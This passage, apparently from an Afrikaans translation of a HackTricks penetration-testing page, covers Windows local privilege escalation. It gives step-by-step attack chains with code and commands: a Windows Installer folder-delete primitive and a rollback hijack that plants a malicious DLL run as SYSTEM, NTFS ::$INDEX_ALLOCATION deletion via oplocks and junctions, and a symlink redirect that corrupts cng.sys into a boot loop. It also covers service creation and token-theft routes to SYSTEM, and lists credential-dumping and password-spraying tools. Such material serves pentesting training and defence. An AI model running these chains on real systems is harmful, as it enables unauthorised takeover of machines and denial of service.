Vir 'n nie-administrateur gee `SetEEUIDirectoryAndFilter` die oproeper se identiteit slegs deur terwyl die verskafde pad met `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` en `FILE_FLAG_OPEN_REPARSE_POINT` oopgemaak word. Dit bewys dat die oproeper die gids kan skrap en verhoed dat 'n reparse point gevolg word, maar dit koppel **nie** die nagegane lêerobjek aan latere skoonmaak nie en bewys ook nie dat Windows Installer dit geskep het nie.<sup>[[41]](#references)</sup>

Ná `MsiBeginTransactionW` skeduleer `SetEEUIDirectoryAndFilter` die pad as 'n gids, ongeag die oproeper se filterargument. Die diens skryf 'n benoemde `REG_DWORD`-waarde onder `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: die waardenaam is die oproeper-beheerde pad en data `0x00000002` is die gidsvlag. `CleanupTempPackages(NULL, FALSE)` begin dan die skoonmaak direk. Die verhoogde werker daarvan tel die registerwaardes op en stuur gidsinskrywings na rekursiewe `FDeleteFolder` sonder om die pad se herkoms na te gaan. As normale verwydering misluk, roep die kode ook `LockdownPath` aan, vee lêerkenmerke uit en probeer weer.<sup>[[41]](#references)</sup>

Die minimale oproepvolgorde wat uit `msi.dll` herwin is, is:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Die nuttige primitief is path-hergebruik eerder as ’n junction redirect. Registreer ’n aanvaller-geskepte `C:\Config.Msi`, verwyder dit en laat Windows Installer later dieselfde padnaam herskep met beskermde rollback-data. Cleanup vertrou die verouderde `TempPackages`-naam en verwyder die nuwe gids as SYSTEM. Dit omseil die beoogde grens van `FILE_FLAG_OPEN_REPARSE_POINT` en redirection-trust mitigation omdat geen reparse point nodig is nie.<sup>[[41]](#references)</sup>

Hierdie deletion-primitief pas by die rollback-ketting hieronder: behou die afsonderlike `Installer\Folders`-rekord, verwyder die beskermde `C:\Config.Msi`, skep dit weer met ’n NULL DACL en behou ’n handle wat `WRITE_DAC` toegestaan is voordat die installer die DACL verhard. Die vooraf oopgemaakte handle kan ’n permissiewe DACL met `NtSetSecurityObject` herstel, waarna die gegenereerde `.rbs` vervang kan word voordat rollback hervat.<sup>[[41]](#references)</sup>

Microsoft het die pad reggemaak deur te voorkom dat `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aanroep wanneer die nuwe feature gate geaktiveer is. Die COM-aanroep kan steeds sukses teruggee, maar plaas nie meer die aanvaller-beheerde pad in `TempPackages` nie. Pas die Windows-sekuriteitsopdaterings van April 2025 toe eerder as om ’n suksesvolle metode-terugkeer as ’n toets vir die regstelling te gebruik.<sup>[[41]](#references)[[42]](#references)</sup>

Die opgesomde tegniek is soos volg:

1. **Stage 1 – Voorbereiding vir die Hijack (laat `C:\Config.Msi` leeg)**

- Stap 1: Installeer die MSI
    - Skep ’n `.msi` wat ’n onskadelike lêer (bv. `dummy.txt`) in ’n skryfbare gids (`TARGETDIR`) installeer.
    - Merk die installer as **"UAC Compliant"**, sodat ’n **nie-admin-gebruiker** dit kan uitvoer.
    - Hou ’n **handle** na die lêer oop ná installering.

- Stap 2: Begin die verwydering
    - Verwyder dieselfde `.msi`.
    - Die verwyderingsproses begin om lêers na `C:\Config.Msi` te skuif en hulle na `.rbf`-lêers (rollback-rugsteune) te hernoem.
    - **Poll die oop lêer-handle** met `GetFinalPathNameByHandle` om vas te stel wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Stap 3: Pasgemaakte sinchronisering
    - Die `.msi` bevat ’n **pasgemaakte verwyderingsaksie (`SyncOnRbfWritten`)** wat:
        - Aandui wanneer `.rbf` geskryf is.
        - Dan **wag** op ’n ander event voordat die verwydering voortgaan.

- Stap 4: Verhoed die verwydering van `.rbf`
    - Wanneer dit aangedui word, **maak die `.rbf`-lêer oop** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit verwyder word**.
    - Gee dan **terugvoer via ’n sein** sodat die verwydering kan klaarmaak.
    - Windows Installer kan nie die `.rbf` verwyder nie, en omdat dit nie al die inhoud kan verwyder nie, **word `C:\Config.Msi` nie verwyder nie**.

- Stap 5: Verwyder `.rbf` handmatig
    - Jy (die aanvaller) verwyder die `.rbf`-lêer handmatig.
    - Nou is **`C:\Config.Msi` leeg**, gereed om gekaap te word.

> Op hierdie punt, **aktiveer die SYSTEM-vlak arbitrary folder delete-kwesbaarheid** om `C:\Config.Msi` te verwyder.

2. **Stage 2 – Vervang rollback-skripte met kwaadwillige skripte**

- Stap 6: Skep `C:\Config.Msi` weer met swak ACLs
    - Skep self die gids `C:\Config.Msi` weer.
    - Stel **swak DACLs** in (bv. Everyone:F), en **hou ’n handle oop** met `WRITE_DAC`.

- Stap 7: Voer nog ’n installering uit
    - Installeer die `.msi` weer, met:
        - `TARGETDIR`: Skryfbare ligging.
        - `ERROROUT`: ’n Veranderlike wat ’n geforseerde mislukking veroorsaak.
    - Hierdie installering sal gebruik word om **rollback** weer te aktiveer, wat `.rbs` en `.rbf` lees.

- Stap 8: Monitor vir `.rbs`
    - Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat ’n nuwe `.rbs` verskyn.
    - Stoor die lêernaam.

- Stap 9: Sinchroniseer voor rollback
    - Die `.msi` bevat ’n **pasgemaakte installeringsaksie (`SyncBeforeRollback`)** wat:
        - ’n Event aandui wanneer die `.rbs` geskep is.
        - Dan **wag** voordat dit voortgaan.

- Stap 10: Pas swak ACL weer toe
    - Nadat die `.rbs created`-event ontvang is:
        - Pas Windows Installer **sterk ACLs weer op** `C:\Config.Msi` toe.
        - Maar aangesien jy steeds ’n handle met `WRITE_DAC` het, kan jy **swak ACLs weer toepas**.

> ACLs word **slegs afgedwing wanneer ’n handle oopgemaak word**, dus kan jy steeds na die gids skryf.

- Stap 11: Plaas vals `.rbs` en `.rbf`
    - Oorskryf die `.rbs`-lêer met ’n **vals rollback-skrip** wat Windows opdrag gee om:
        - Jou `.rbf`-lêer (kwaadwillige DLL) na ’n **bevoorregte ligging** terug te plaas (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Plaas jou vals `.rbf` met ’n **kwaadwillige SYSTEM-vlak payload-DLL**.

- Stap 12: Aktiveer rollback
    - Gee die sinchroniserings-event-sein sodat die installer voortgaan.
    - ’n **tipe 19-pasgemaakte aksie (`ErrorOut`)** is ingestel om die installering doelbewus op ’n bekende punt te laat misluk.
    - Dit laat **rollback begin**.

- Stap 13: SYSTEM installeer jou DLL
    - Windows Installer:
        - Lees jou kwaadwillige `.rbs`.
        - Kopieer jou `.rbf`-DLL na die teikenligging.
    - Jy het nou jou **kwaadwillige DLL in ’n SYSTEM-gelaaide pad**.

- Finale stap: Voer SYSTEM-kode uit
    - Voer ’n vertroude **outomaties verhoogde binêre lêer** (bv. `osk.exe`) uit wat die DLL laai wat jy gekaap het.
    - **Boem**: Jou kode word **as SYSTEM** uitgevoer.


### Van arbitrêre lêerverwydering/-skuif/-hernoeming tot SYSTEM EoP

Die hoof-MSI rollback-tegniek (die vorige een) veronderstel dat jy ’n **hele gids** (bv. `C:\Config.Msi`) kan verwyder. Maar wat as jou kwesbaarheid net **arbitrêre lêerverwydering** toelaat?

Jy kan **NTFS-internals** uitbuit: elke gids het ’n versteekte alternatiewe datastroom genaamd:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Hierdie stream stoor die **indeksmetadata** van die vouer.

As jy dus die `::$INDEX_ALLOCATION`-stream van ’n vouer **uitvee**, **verwyder** NTFS die hele vouer uit die lêerstelsel.

Jy kan dit doen met standaard-API’s vir lêerverwydering, soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Alhoewel jy ’n API aanroep om ’n *lêer* te skrap, **skrap dit die vouer self**.

### Van die skrap van vouerinhoud tot SYSTEM EoP
Wat as jou primitief jou nie toelaat om arbitrêre lêers/vouers te skrap nie, maar **jou wel toelaat om die *inhoud* van ’n aanvaller-beheerde vouer te skrap**?

1. Stap 1: Stel ’n lokvouer en lêer op
- Skep: `C:\temp\folder1`
- Binne-in: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas ’n **oplock** op `file1.txt`
- Die oplock **onderbreek die uitvoering** wanneer ’n bevoorregte proses probeer om `file1.txt` te skrap.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Stap 3: Laat die SYSTEM-proses aktiveer (bv. `SilentCleanup`)
- Hierdie proses skandeer vouers (bv. `%TEMP%`) en probeer om die inhoud daarvan te verwyder.
- Wanneer dit by `file1.txt` kom, **aktiveer die oplock** en gee beheer oor aan jou callback.

4. Stap 4: Binne die oplock-callback – herlei die verwydering

- Opsie A: Skuif `file1.txt` elders heen
    - Dit maak `folder1` leeg sonder om die oplock te breek.
    - Moenie `file1.txt` direk uitvee nie — dit sal die oplock voortydig vrystel.

- Opsie B: Skakel `folder1` om na ’n **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opsie C: Skep ’n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dit teiken die interne NTFS-stroom wat vouermetadata stoor — as jy dit uitvee, word die vouer uitgevee.

5. Stap 5: Laat die oplock los
- Die SYSTEM-proses gaan voort en probeer `file1.txt` uitvee.
- Maar nou, weens die junction + symlink, vee dit eintlik die volgende uit:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Resultaat**: `C:\Config.Msi` word deur SYSTEM geskrap.

### Van arbitrêre vouerskepping tot permanente DoS

Gebruik ’n primitive waarmee jy ’n **arbitrêre vouer as SYSTEM/admin kan skep** — selfs al **kan jy nie lêers skryf** of **swak toestemmings instel nie**.

Skep ’n **vouer** (nie ’n lêer nie) met die naam van ’n **kritieke Windows-driver**, bv.:
```
C:\Windows\System32\cng.sys
```

- This path stem gewoonlik ooreen met die `cng.sys`-kernelmodusdrywer.
- As jy dit **vooraf as ’n vouer skep**, kan Windows nie die werklike drywer tydens opstart laai nie.
- Daarna probeer Windows om `cng.sys` tydens opstart te laai.
- Dit sien die vouer, **kan nie die werklike drywer vind nie**, en **crash of stop die opstart**.
- Daar is **geen terugvalopsie** en **geen herstel** sonder ingryping van buite (bv. opstartherstel of skyftoegang).

### Van bevoorregte log-/rugsteunpaaie + OM-simboliese skakels na arbitrêre lêeroorskryf / boot-DoS

Wanneer ’n **bevoorregte diens** logs/exports na ’n pad skryf wat uit ’n **skryfbare konfigurasie** gelees word, herlei daardie pad met **Object Manager-simboliese skakels + NTFS-mount points** om die bevoorregte skryfbewerking in ’n arbitrêre oorskrywing te omskep (selfs **sonder SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Vereistes**
- Die konfigurasie wat die teikenpad stoor, is skryfbaar vir die aanvaller (bv. `%ProgramData%\...\.ini`).
- Vermoë om ’n mount point na `\RPC Control` en ’n OM-lêersimboliese skakel te skep (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- ’n Bevoorregte bewerking wat na daardie pad skryf (log, export, verslag).

**Voorbeeldketting**
1. Lees die konfigurasie om die bevoorregte logbestemming te bepaal, bv. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Herlei die pad sonder admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag vir die bevoorregte komponent om die log te skryf (bv. ’n admin aktiveer "send test SMS"). Die skryfbewerking beland nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die oorskryfde teiken (hex/PE-parser) om korrupsie te bevestig; ’n herlaai dwing Windows om die aangepaste bestuurderpad te laai → **boot loop DoS**. Dit geld ook vir enige beskermde lêer wat ’n bevoorregte diens vir skryfwerk sal oopmaak.

> `cng.sys` word normaalweg vanaf `C:\Windows\System32\drivers\cng.sys` gelaai, maar as ’n kopie in `C:\Windows\System32\cng.sys` bestaan, kan dit eerste probeer word, wat dit ’n betroubare DoS-teiken vir korrupte data maak.



## **Van High Integrity na System**

### **Nuwe diens**

As jy reeds in ’n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees: **skep en voer net ’n nuwe diens uit**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Wanneer jy ’n diensbinêr skep, maak seker dat dit ’n geldige diens is of dat die binêr die nodige aksies vinnig uitvoer, aangesien dit binne 20s beëindig sal word as dit nie ’n geldige diens is nie.

### AlwaysInstallElevated

Vanuit ’n proses met Hoë Integriteit kan jy probeer om **die AlwaysInstallElevated-registerinskrywings te aktiveer** en ’n omgekeerde shell te **installeer** met ’n _**.msi**_-omhulsel.\
[Meer inligting oor die betrokke registersleutels en hoe om ’n _.msi_-pakket te installeer, is hier.](#alwaysinstallelevated)

### Hoë + SeImpersonate-voorreg tot System

**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**

### Van SeDebug + SeImpersonate na Full Token-voorregte

As jy hierdie tokenvoorregte het (jy sal dit waarskynlik in ’n proses met Hoë Integriteit vind), sal jy met die SeDebug-voorreg **byna enige proses** (behalwe beskermde prosesse) kan **oopmaak**, die proses se **token kopieer** en ’n **willekeurige proses met daardie token skep**.\
Hierdie tegniek behels gewoonlik dat jy **enige proses kies wat as SYSTEM loop en al die tokenvoorregte het** (_ja, jy kan SYSTEM-prosesse vind wat nie al die tokenvoorregte het nie_).\
**Jy kan ’n** [**kodevoorbeeld wat die voorgestelde tegniek uitvoer, hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

meterpreter gebruik hierdie tegniek om in `getsystem` te eskaleer. Die tegniek behels dat jy **’n pipe skep en dan ’n diens skep/misbruik om na daardie pipe te skryf**. Daarna sal die **bediener** wat die pipe met die **`SeImpersonate`**-voorreg geskep het, die pipe-kliënt (die diens) se **token kan naboots** en sodoende SYSTEM-voorregte verkry.\
As jy [**meer oor name pipes wil leer, lees dit**](#named-pipe-client-impersonation).\
As jy ’n voorbeeld wil lees van [**hoe om met name pipes van Hoë Integriteit na System te gaan, lees dit**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om ’n dll te **kaap** wat deur ’n **proses** wat as **SYSTEM** loop, **gelaai** word, sal jy arbitrêre kode met daardie toestemmings kan uitvoer. Dll Hijacking is dus ook nuttig vir hierdie soort voorreg-eskalasie, en boonop is dit **baie makliker om vanuit ’n proses met Hoë Integriteit te bereik**, aangesien dit **skryftoestemmings** sal hê op die vouers wat gebruik word om dlls te laai.\
**Jy kan** [**hier meer oor Dll hijacking leer**](dll-hijacking/index.html)**.**

### **Van Administrator of Network Service na System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Van LOCAL SERVICE of NETWORK SERVICE na volle voorregte

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nuttige gereedskap

**Beste hulpmiddel om Windows plaaslike voorreg-eskalasievektore te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir verkeerde konfigurasies en sensitiewe lêers (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Bespeur.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir moontlike verkeerde konfigurasies en versamel inligting (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir verkeerde konfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Onttrek gestoorde sessie-inligting van PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP. Gebruik -Thorough plaaslik.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek geloofsbriewe uit Credential Manager. Bespeur.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spuit versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is ’n PowerShell ADIDNS/LLMNR/mDNS-spoofer en man-in-the-middle-gereedskap.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese Windows-privesc-enumerasie**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek na bekende privesc-kwesbaarhede (VEROUDERD; gebruik Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Plaaslike kontroles **(Benodig Admin-regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc-kwesbaarhede (moet met VisualStudio saamgestel word) ([**vooraf saamgestel**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumereer die gasheer op soek na verkeerde konfigurasies (meer ’n hulpmiddel om inligting te versamel as privesc) (moet saamgestel word) **(**[**vooraf saamgestel**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek geloofsbriewe uit baie sagteware (vooraf saamgestelde exe op github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Oordrag van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kontroleer vir verkeerde konfigurasies (vooraf saamgestelde uitvoerbare lêer op github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike verkeerde konfigurasies (exe vanaf python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Hulpmiddel wat op grond van hierdie plasing geskep is (dit het nie accesschk nodig om behoorlik te werk nie, maar kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (plaaslike python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (plaaslike Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek saamstel met die korrekte weergawe van .NET ([sien dit](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffergasheer te sien, kan jy die volgende doen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grondbeginsels van Windows-voorregte-eskalasie](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Verhoog voorregte deur swak vouertoestemmings uit te buit](http://www.greyhathacker.net/?p=738)
- [3] [Windows-voorregte-eskalasie - ’n cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Werkswinkel oor plaaslike voorregte-eskalasie in Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows-aanvalle: AT is die nuwe swart (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Voorregte-eskalasie - Windows - Volledige OSCP-gids](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Voorregte-eskalasie - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Gids vir Windows-voorregte-eskalasie](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolelys vir Windows-voorregte-eskalasie](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-voorregte-eskalasie](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metodes vir Windows-voorregte-eskalasie vir pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA-makro-phishing via SMTP → hMailServer-geloofsbriewe-dekripsie → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Formatstring-lek + stack BOF → VirtualAlloc ROP (RCE) en kerntoken-diefstal](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Op die spoor van die Silver Fox: Kat-en-muis in kerngeskaduwees](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Kwesbaarheid in ’n bevoorregte lêerstelsel teenwoordig in ’n SCADA-stelsel](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Simboliese skakel-toetsnutsgoed – Gebruik van CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [’n Skakel na die verlede. Misbruik van simboliese skakels in Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Totsiens RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF-poort)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Gevaarlike module-resolusie in Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-modules: laai vanaf `node_modules`-vouers](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++-kontrolelysuitdagings, opgelos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues-funksie](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Diensbinêre-kaping](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own met Microslop: Kombinering van CLDFLT en DirectX-kernras-toestande vir Windows-LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Een I/O Ring om hulle almal te beheer: ’n Volledige lees-/skryf-uitbuitingsprimitief in Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Misbruik van arbitrêre lêerverwyderings om voorregte te eskaleer en ander goeie truuks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Uitbuitingskode vir FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-aanvalle Deel 2: CVE-2020-1013, ’n Windows 10-plaaslike voorregte-eskalasie-1-dag](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Verken Credential Manager en Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos-hulpbron-gebaseerde beperkte delegering: Wanneer ’n beeldverandering tot voorregte-eskalasie lei](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Onttrekking van private SSH-sleutels uit Windows 10 se SSH-agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Verander ondernemingsopdateringsbedieners in agterdeur-fabrieke (0_o) – Deel 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Verander ondernemingsopdateringsbedieners in agterdeur-fabrieke (0_o) – Deel 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Voorregte-eskalasie deur die verwydering van die Microsoft Windows Installer-lêergids](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
